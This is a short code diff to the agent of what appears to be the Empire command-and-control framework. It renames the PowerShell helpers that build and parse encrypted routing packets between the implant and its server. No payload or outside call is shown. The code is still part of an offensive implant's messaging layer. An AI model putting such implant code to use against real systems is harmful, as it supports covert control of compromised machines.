@@ -599,7 +599,7 @@ function Invoke-Empire {
     function New-RoutingPacket {
         param($EncData, $Meta)
         $SKB = $Encoding.GetBytes($StagingKey);
-        $RoutingPacketData = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $Script:SessionId -Language 1 -Meta $Meta -Additional 0 -EncData $EncBytes
+        $RoutingPacketData = Build-RoutingPacket -StagingKeyBytes $SKB -SessionId8 $Script:SessionId -Language 1 -Meta $Meta -Additional 0 -EncData $EncBytes
         return $RoutingPacketData
     }
 
@@ -608,7 +608,7 @@ function Invoke-Empire {
         [byte[]]$SKB = [Text.Encoding]::UTF8.GetBytes($StagingKey)
 
         # Decode once; the function already coerces object[] to byte[]
-        $pktMap = Decode-ChaChaRoutingPacket -PacketData $PacketData -StagingKeyBytes $SKB
+        $pktMap = Parse-RoutingPacket -PacketData $PacketData -StagingKeyBytes $SKB
 
 
         # Pick the entry for our session, or fall back to the first
